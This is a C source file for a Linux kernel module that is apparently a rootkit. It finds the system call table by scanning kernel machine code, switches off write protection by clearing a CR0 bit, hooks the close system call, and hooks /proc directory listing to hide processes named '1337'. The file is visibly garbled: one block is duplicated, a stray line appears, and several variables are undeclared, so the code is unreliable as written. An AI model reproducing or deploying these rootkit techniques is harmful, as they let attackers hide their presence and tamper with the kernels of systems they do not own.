#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan Castets & Olivier Huge");
MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");

#define SEARCH_RANGE 512
#define PATTERN_SIZE 7

static void **sys_call_table;
static void **ia32_sys_call_table;

asmlinkage long (*real_close)(struct pt_regs *);

asmlinkage long fake_close(struct pt_regs *regs) {
  printk(KERN_INFO "sys_close hooked");
  return (*real_close)(regs);
}

static void search_sys_call_table(void) {
  int i, j;
  int *do_syscall_64_offset;
  int *sys_call_table_offset;
  int *ia32_sys_call_table_offset;
  unsigned char *do_syscall_64;
  unsigned char *entry_SYSCALL_64 = (unsigned char *)native_read_msr(MSR_LSTAR);
  unsigned char pattern_0[] = {0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xe8};
  unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
  unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};

  for (i = 0; i < SEARCH_RANGE; i++) {
    for (j = 0; j < PATTERN_SIZE; j++)
      if (entry_SYSCALL_64[i + j] != pattern_0[j])
	break;

    if (j == PATTERN_SIZE) {
      do_syscall_64_offset = (int *)(entry_SYSCALL_64 + i + PATTERN_SIZE);
      do_syscall_64 = (unsigned char *)(entry_SYSCALL_64 + i + PATTERN_SIZE + sizeof(int) + *do_syscall_64_offset);
      printk(KERN_INFO "call to do_syscall_64 at %p (%p)", entry_SYSCALL_64 + i + PATTERN_SIZE - 1, do_syscall_64);
      break;
    } 
  }

  if (!do_syscall_64) {
    printk(KERN_INFO "failed to find do_syscall_64 address");
    return;
  }
  
  for (i = 0; i < SEARCH_RANGE; i++) {
    for (j = 0; j < PATTERN_SIZE; j++)
      if (do_syscall_64[i + j] != pattern_1[j])
	break;
    
    if (j == PATTERN_SIZE) {
      sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
      sys_call_table = (void **)(*sys_call_table_offset);
      printk(KERN_INFO "call to sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, sys_call_table); 
      break;
    } 
  }

  for ( ; i < SEARCH_RANGE; i++) {
    for (j = 0; j < PATTERN_SIZE; j++)
      if (do_syscall_64[i + j] != pattern_2[j])
	break;

    if (j == PATTERN_SIZE) {
      ia32_sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
      ia32_sys_call_table = (void **)(*ia32_sys_call_table_offset);
      printk(KERN_INFO "call to ia32_sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, ia32_sys_call_table);
    }
  }

  if (!sys_call_table)
    printk(KERN_INFO "failed to find sys_call_table address");

  if (!ia32_sys_call_table)
    printk(KERN_INFO "failed to find ia32_sys_call_table address");
}



/* --------------------------------------------------------------------- */

C

static char *proc_to_hide = "1337";
static struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
			loff_t off, u64 ino, unsigned int d_type)
{
  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
    return 0;

  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
  .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
  int result = 0;
  rk_ctx.pos = ctx->pos;
  backup_ctx = ctx;
  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
  ctx->pos = rk_ctx.pos;

  return result;
}

static char *proc_to_hide = "1337";
static struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
			loff_t off, u64 ino, unsigned int d_type)
{
  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
    return 0;

  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
  .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
  int result = 0;
  rk_ctx.pos = ctx->pos;
  backup_ctx = ctx;
  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
  ctx->pos = rk_ctx.pos;

  return result;
}

static struct file_operations backup_fops;
static struct file_operations new_fops;
static struct inode proc_inode;

int (*backup_iterate_shared) (struct file *, struct dir_context *);

static void hide_process(pid_t pid) {
  struct path p;

  if(kern_path("/proc", 0, &p))
    return 0;

  /* get the inode*/
  proc_inode = p.dentry->d_inode;
  
  /* get a copy of file_operations from inode */
  proc_fops = *proc_inode->i_fop;
  /* backup the file_operations */
  backup_proc_fops = proc_inode->i_fop;
  /* modify the copy with out evil function */
  proc_fops.iterate_shared = rk_iterate_shared;
  /* overwrite the proc entry's file_operations */
  proc_inode->i_fop = &proc_fops;

  return 0;
}

static void unhide_process() {
  /* fetch the proc entry */
  struct path p;

  if(kern_path("/proc", 0, &p))
    return;

  /* get inode and restore file_operations */
  proc_inode = p.dentry->d_inode;
  proc_inode->i_fop = backup_proc_fops;
}

static void hook_syscall(void) {
  if (!sys_call_table) {
    printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
    return;
  }

  write_cr0(read_cr0() & ~0x10000);
  real_close = sys_call_table[__NR_close];
  sys_call_table[__NR_close] = fake_close;
  write_cr0(read_cr0() | 0x10000);
}

static void unhook_syscall(void) {
  if (!sys_call_table) {
    printk(KERN_INFO "failed to reset syscall, sys_call_table address is missing");
    return;
  }

  write_cr0(read_cr0() & ~0x10000);
  sys_call_table[__NR_close] = real_close;
  write_cr0(read_cr0() | 0x10000);
}

int init_module(void) {
  printk(KERN_INFO "prime module started");
  search_sys_call_table();
  hook_syscall();
  return 0;
}

void cleanup_module(void) {
  unhook_syscall();
  printk(KERN_INFO "prime module stopped");
}
